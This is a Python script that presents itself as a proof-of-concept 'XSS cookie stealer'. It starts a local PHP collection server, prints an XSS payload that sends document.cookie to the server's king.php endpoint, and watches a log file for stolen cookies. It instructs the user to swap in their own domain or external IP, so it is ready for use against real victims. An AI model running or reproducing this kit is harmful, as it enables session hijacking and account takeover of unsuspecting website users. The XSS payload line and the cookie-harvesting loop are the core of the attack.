#-*- coding: utf-8 -*-
#
#    P.O.C | XSS COOKIE STEALER
#          by: Alisson Moretto 
#                
#############################
from time import sleep
from sys import stdout, exit
from os import system
from subprocess import call
import multiprocessing

RED, WHITE, YELLOW, CIANO, GREEN, END = '\033[91m', '\33[46m', '\33[93m', '\33[100m', '\033[1;32m', '\033[0m'

def runPEnv():
    system('clear')
    print '''                                        
  ██████  ██████   ██████  ██   ██ ██ ███    ██  ██████  ██   ██ ███████ ███████
 ██      ██    ██ ██    ██ ██  ██  ██ ████   ██ ██        ██ ██  ██      ██
 ██      ██    ██ ██    ██ █████   ██ ██ ██  ██ ██   ███   ███   ███████ ███████ 
 ██      ██    ██ ██    ██ ██  ██  ██ ██  ██ ██ ██    ██  ██ ██       ██      ██ 
  ██████  ██████   ██████  ██   ██ ██ ██   ████  ██████  ██   ██ ███████ ███████{1}                      
                    [ {0}PROOF OF CONCEPT {1}|{0} XSS COOKIE STEALER {1}]\n\n                      {1}Twitter: https://twitter.com/A1S0N_{1} \n'''.format(GREEN, END, YELLOW)

    for i in range(101):
        sleep(0.01)
        stdout.write("\r{0}[{1}*{0}]{1} Preparing environment... %d%%".format(GREEN, END) % i)
        stdout.flush()
    print "\n\n{0}[{1}*{0}]{1} Searching for PHP installation... ".format(GREEN, END) 
    if 256 != system('which php'):
        print " --{0}>{1} OK.".format(GREEN, END)
    else:
	print " --{0}>{1} PHP NOT FOUND: \n {0}*{1} Please install PHP and run me again. http://www.php.net/".format(RED, END)
        exit(0)
    print "\n{0}[{1}*{0}]{1} Setting up {2}KING.PHP{1}... ".format(GREEN, END, RED)
    system('touch Server/log.txt')
    print " --{0}>{1} DONE.".format(GREEN, END)
    print '''\n{0}[{1}*{0}]{3} XSS {1}example{1} format: \n--{0}>{1} {4}<script><a href="#" onclick="document.location='{2}http://127.0.0.1{1}{4}/king.php?cookie=' +escape(document.cookie);">CLICK HERE</a></script>{1}\n\n{2}[{1}!{2}]{1} Replace {2}YELLOW{1} links with your domain or external ip.
 '''.format(GREEN, END, YELLOW, RED, CIANO)

def runServer():
    system("cd Server && sudo php -S 127.0.0.1:80")

def waitCookies():
    print "{0}[{1}*{0}]{1} Waiting for cookies... \n".format(GREEN, END)
    while True:
        with open('Server/log.txt') as cookie:
            lines = cookie.read().rstrip()
        if len(lines) != 0: 
            print '{0}[COOKIE]: %s{1}'.format(GREEN, END) % lines
            system('rm -rf Server/log.txt && touch Server/log.txt')
        cookie.close()

if __name__ == "__main__":
    runPEnv()
    multiprocessing.Process(target=runServer).start()
    waitCookies()


